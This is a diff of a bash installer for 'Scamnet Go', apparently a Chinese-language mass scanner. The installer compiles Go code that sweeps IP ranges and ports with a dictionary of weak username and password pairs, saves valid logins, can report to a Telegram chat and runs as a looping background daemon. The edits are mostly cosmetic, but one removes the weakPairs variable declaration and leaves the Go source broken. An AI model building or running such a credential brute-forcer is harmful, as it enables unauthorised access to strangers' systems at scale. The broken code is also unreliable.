@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.3 OTC TG:soqunla （日志极致优化 + 自动轮转）
+# main.sh - Scamnet Go v1.3 OTC TG:soqunla （终极版）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -41,7 +41,7 @@ echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 
 log "正在编译 Go 扫描器（OTC 优化版 TG:soqunla）..."
 
-# ============ 完全修复的 Go 源码（Scamnet Go v1.3 OTC TG:soqunla ） ============
+# ============ 完全修复的 Go 源码（终极版） ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -62,7 +62,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-
 	"golang.org/x/sync/semaphore"
 )
 
@@ -91,7 +90,7 @@ type IPInfo struct {
 }
 
 // === 412 条弱口令字典（已去重）===
-var weakPairs = [][2]string{
+
 	{"", ""}, {"0", "0"}, {"00", "00"}, {"000", "000"}, {"0000", "0000"}, {"00000", "00000"}, {"000000", "000000"},
 	{"1", "1"}, {"11", "11"}, {"111", "111"}, {"1111", "1111"}, {"11111", "11111"}, {"111111", "111111"},
 	{"2", "2"}, {"22", "22"}, {"222", "222"}, {"2222", "2222"}, {"22222", "22222"}, {"222222", "222222"},
@@ -173,7 +172,7 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -349,7 +348,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted {
 		out.WriteString(l + "\n")
 	}
@@ -408,13 +407,13 @@ cat > "$GUARD_SCRIPT" << 'EOF'
 LOG="$LATEST_LOG"
 MAX_LINES=500
 
-# 清空旧日志
+# 确保日志文件存在
 > "$LOG"
-echo "[GUARD] $(date) - Scamnet OTC TG:soqunla 启动" | tee -a "$LOG"
+echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - Scamnet OTC TG:soqunla 启动" | tee -a "$LOG"
 echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "$LOG"
 
 while :; do
-    echo "[GUARD] $(date) - 开始扫描..." | tee -a "$LOG"
+    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "$LOG"
 
     $GO_BIN \
         -start "$START_IP" \
@@ -427,10 +426,8 @@ while :; do
         -timeout 6 \
         2>&1 | grep -E '^\[\+\]|\[GUARD\]' | tee -a "$LOG"
 
-    # 保留最后 500 行
     tail -n "$MAX_LINES" "$LOG" > "$LOG.tmp" 2>/dev/null && mv "$LOG.tmp" "$LOG"
-
-    echo "[GUARD] $(date) - 本轮结束，3秒后重启..." | tee -a "$LOG"
+    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "$LOG"
     sleep 3
 done
 EOF
@@ -441,7 +438,7 @@ pkill -f "scamnet_guard.sh" 2>/dev/null || true
 sleep 1
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
 succ "守护进程已启动 TG:soqunla！PID: $!"
-log "日志: tail -f $LATEST_LOG  (仅 500 行)"
+log "日志: tail -f $LATEST_LOG (仅 500 行)"
 log "停止: pkill -f scamnet_guard.sh"
 log "结果: cat $VALID_FILE"
 log "空间释放: > $LATEST_LOG"
